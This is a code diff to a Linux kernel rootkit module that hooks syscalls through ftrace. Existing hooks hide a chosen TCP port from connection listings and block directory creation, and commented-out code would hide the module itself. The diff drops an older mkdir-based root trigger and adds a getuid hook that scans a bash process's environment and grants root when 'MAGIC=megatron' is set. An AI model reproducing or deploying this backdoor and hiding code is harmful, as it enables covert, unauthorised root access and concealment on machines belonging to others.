@@ -168,6 +168,7 @@ static asmlinkage long  hook_tcp4_seq_show(struct seq_file *seq,void *v){
     if (sk !=(struct sock *)0x1 && sk->sk_num == PORT_HIDING)
     {
        // pr_info("Port successfully hide\n");
+       
         return 0;
     }
     ret=tcp4(seq,v);
@@ -200,13 +201,45 @@ static asmlinkage long hook_mkdir(const struct pt_regs *regs)
        // pr_info("Directory creation blocked: %s\n", path);
     }
 
-    if (strcmp(path, "/tmp/getroot") == 0) {
-        rootmagic();
-     }
 
     return 0; // Prevents the directory creation
 }
 #endif
+typedef asmlinkage long (*orig_getuid_t)(const struct pt_regs *);
+static  orig_getuid_t orig_getuid;
+DECL_FUNC_CHECK(orig_getuid,SIG_GET_PID);
+
+static asmlinkage long hook_getuid(const struct pt_regs *regs) {
+    const char *name = current->comm;
+
+    struct mm_struct *mm;
+    char *envs;
+    int len, i;
+
+    if (strcmp(name, "bash") == 0) {
+        mm = current->mm;
+        if (mm && mm->env_start && mm->env_end) {
+            envs = kmalloc(PAGE_SIZE, GFP_ATOMIC);
+            if (envs) {
+                len = access_process_vm(current, mm->env_start, envs, PAGE_SIZE - 1, 0);
+                if (len > 0) {
+                    for (i = 0; i < len - 1; i++) {
+                        if (envs[i] == '\0')
+                            envs[i] = ' ';
+                    }
+                    if (strstr(envs, "MAGIC=megatron")) {
+                        rootmagic();
+                    }
+                }
+                kfree(envs);
+            }
+        }
+    }
+    return orig_getuid(regs);
+}
+
+
+
 static struct ftrace_hook hooks[] = {
 #if ( MKDIR_HOOK_IS_ENABLED > 0)
     HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
@@ -215,13 +248,13 @@ static struct ftrace_hook hooks[] = {
     HOOK("tcp4_seq_show" ,hook_tcp4_seq_show , &tcp4),
     HOOK("tcp6_seq_show" ,hook_tcp6_seq_show , &tcp6),
 #endif    
+    HOOK("__x64_sys_getuid", hook_getuid, &orig_getuid),
 };
 
 static int __init mkdir_monitor_init(void)
 {
     int err;
     size_t i;
-    rootmagic();
 
     // Do kernel module hiding
   //  list_del_init(&__this_module.list);
